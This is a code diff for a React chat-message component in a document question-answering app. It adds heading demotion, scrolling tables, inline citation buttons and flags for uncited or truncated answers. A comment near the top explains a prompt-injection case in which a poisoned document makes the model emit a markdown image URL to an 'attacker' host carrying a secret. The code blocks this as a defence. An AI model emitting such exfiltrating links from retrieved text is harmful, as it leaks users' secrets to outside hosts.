@@ -2,8 +2,10 @@ import { memo, useEffect, useMemo, useRef, useState } from 'react';
 import type { ReactNode } from 'react';
 import type { Components } from 'react-markdown';
 import type { CitationResponse, FeedbackRating, TimingsResponse } from '../api/types';
-import { TIME_FORMATTER, withCitationFootnotes } from '../utils/exportChat';
+import { formatTurnTime, withCitationFootnotes } from '../utils/exportChat';
 import { citationNumberFromHref, linkCitations } from '../utils/citations';
+import { usePreviewTrigger } from '../hooks/usePreviewTrigger';
+import { pageLabel } from '../utils/pages';
 import CitationCard from './CitationCard';
 import { useMarkdownRenderer } from './markdownLoader';
 import StreamingSkeleton from './StreamingSkeleton';
@@ -14,9 +16,25 @@ import { MAX_QUESTION_CHARS } from '../utils/limits';
 // Answers quote retrieved documents, and a poisoned document can steer the model into
 // writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
 // it rendered, no click needed. Show the alt text instead of loading anything.
+//
+// Headings move down to h3-h6: an answer's "# Summary" sat as a second <h1> under the
+// conversation title's, and screen-reader heading navigation treated each answer's
+// headings as top-level sections of the page.
 const MARKDOWN_COMPONENTS: Components = {
   img: ({ alt }) => (alt ? <span className="chat-message__image-alt">[{alt}]</span> : null),
   a: ({ href, children }) => <ExternalLink href={href}>{children}</ExternalLink>,
+  h1: ({ children }) => <h3>{children}</h3>,
+  h2: ({ children }) => <h4>{children}</h4>,
+  h3: ({ children }) => <h5>{children}</h5>,
+  h4: ({ children }) => <h6>{children}</h6>,
+  h5: ({ children }) => <h6>{children}</h6>,
+  h6: ({ children }) => <h6>{children}</h6>,
+  // Wide tables scroll inside the answer instead of widening the page on a phone.
+  table: ({ children }) => (
+    <div className="chat-message__table-scroll">
+      <table>{children}</table>
+    </div>
+  ),
 };
 
 // A link followed in this tab used to unload the app mid-answer. `noreferrer` also
@@ -28,6 +46,34 @@ function ExternalLink({ href, children }: { href?: string; children?: ReactNode 
     </a>
   );
 }
+/** An inline [n] marker: previews its source on hover or focus, opens it on click. */
+function InlineCitation({
+  number,
+  source,
+  onOpen,
+  onHoverStart,
+  onHoverEnd,
+}: {
+  number: number;
+  source: CitationResponse;
+  onOpen: () => void;
+  onHoverStart: () => void;
+  onHoverEnd?: () => void;
+}) {
+  const trigger = usePreviewTrigger({ onOpen, onHoverStart, onHoverEnd });
+  return (
+    <button
+      type="button"
+      className="chat-message__cite"
+      {...trigger}
+      aria-label={`Source ${number}: ${source.filename}, ${pageLabel(source.page, source.page_end).replace('p.', 'page ')}`}
+      data-testid="inline-citation"
+    >
+      {number}
+    </button>
+  );
+}
+
 // Error turns created before this page load are history, not news: announcing each one
 // as an alert on every conversation switch or reload read out stale failures.
 const SESSION_STARTED_AT = Date.now();
@@ -66,6 +112,10 @@ export interface ChatTurn {
   // The server said the documents don't answer it (answer_status insufficient_context
   // or no_context): still an answer, shown with a "not found" flag.
   notFound?: boolean;
+  // The answer cites none of its sources (answer_status uncited): worth checking.
+  uncited?: boolean;
+  // The provider stopped at the token limit, so the answer ends mid-way.
+  truncated?: boolean;
 }
 
 interface ChatMessageProps {
@@ -235,23 +285,13 @@ function ChatMessage({
         const source = byNumber.get(number);
         if (!source) return <>[{number}]</>;
         return (
-          <button
-            type="button"
-            className="chat-message__cite"
-            onClick={() => {
-              onCitationLeave?.();
-              onOpenSource?.(source.filename, source.chunk_id, quotesOf(source));
-            }}
-            onMouseEnter={() => onCitationHover?.(source)}
-            onMouseLeave={onCitationLeave}
-            // The preview a pointer gets on hover, for the keyboard too.
-            onFocus={() => onCitationHover?.(source)}
-            onBlur={onCitationLeave}
-            aria-label={`Source ${number}: ${source.filename}, page ${source.page}`}
-            data-testid="inline-citation"
-          >
-            {number}
-          </button>
+          <InlineCitation
+            number={number}
+            source={source}
+            onOpen={() => onOpenSource?.(source.filename, source.chunk_id, quotesOf(source))}
+            onHoverStart={() => onCitationHover?.(source)}
+            onHoverEnd={onCitationLeave}
+          />
         );
       },
     };
@@ -393,11 +433,29 @@ function ChatMessage({
                   not in your documents
                 </span>
               )}
+              {turn.uncited && (
+                <span
+                  className="chat-message__flag chat-message__flag--warn"
+                  title="The answer cites none of the passages it was given — check it against your documents"
+                  data-testid="chat-message-uncited"
+                >
+                  no sources cited
+                </span>
+              )}
+              {turn.truncated && (
+                <span
+                  className="chat-message__flag chat-message__flag--warn"
+                  title="The model reached its output limit (LLM_MAX_TOKENS) and stopped mid-answer"
+                  data-testid="chat-message-truncated"
+                >
+                  cut off
+                </span>
+              )}
               <time
                 className="chat-message__timestamp mono"
                 dateTime={new Date(turn.timestamp).toISOString()}
               >
-                {TIME_FORMATTER.format(turn.timestamp)}
+                {formatTurnTime(turn.timestamp)}
               </time>
               {turn.content && (
                 <button
@@ -462,6 +520,7 @@ function ChatMessage({
                     sourceNumber={source.source_number}
                     filename={source.filename}
                     page={source.page}
+                    pageEnd={source.page_end}
                     section={source.section}
                     onOpen={
                       onOpenSource
